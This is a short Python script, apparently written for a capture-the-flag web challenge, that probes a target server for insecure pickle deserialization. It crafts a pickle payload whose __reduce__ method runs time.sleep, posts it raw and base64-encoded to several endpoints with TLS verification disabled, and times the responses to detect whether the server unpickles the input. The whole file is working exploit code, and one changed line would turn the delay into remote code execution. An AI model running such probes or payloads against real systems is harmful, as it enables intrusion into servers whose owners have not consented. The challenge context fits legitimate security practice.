import requests, pickle, time, os
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
class Sleep:
    def __reduce__(self):
        return (time.sleep,(4,))
payload=pickle.dumps(Sleep())
def timed(path,data,ct):
    t0=time.time()
    try:
        r=requests.post(URL.rstrip("/")+path, data=data, headers={"Content-Type":ct}, timeout=12, verify=False)
        return round(time.time()-t0,3), r.status_code, len(r.content)
    except Exception as e:
        return round(time.time()-t0,3), "ERR", repr(e)[:50]
print("POST /  rawpickle octet:", timed("/",payload,"application/octet-stream"))
print("POST /login rawpickle octet:", timed("/login",payload,"application/octet-stream"))
print("POST /  rawpickle none :", timed("/",payload,None))
print("POST / plain:", timed("/",b"hello","text/plain"))
# also GET with body
t0=time.time()
try:
    r=requests.get(URL, data=payload, headers={"Content-Type":"application/octet-stream"}, timeout=12, verify=False)
    print("GET / rawpickle:", round(time.time()-t0,3), r.status_code, len(r.content))
except Exception as e:
    print("GET / rawpickle ERR", repr(e)[:50])
# base64 pickle body
import base64
b=base64.b64encode(payload)
print("POST / b64pickle:", timed("/",b,"application/x-www-form-urlencoded"))
print("POST /login b64pickle:", timed("/login",b,"application/x-www-form-urlencoded"))
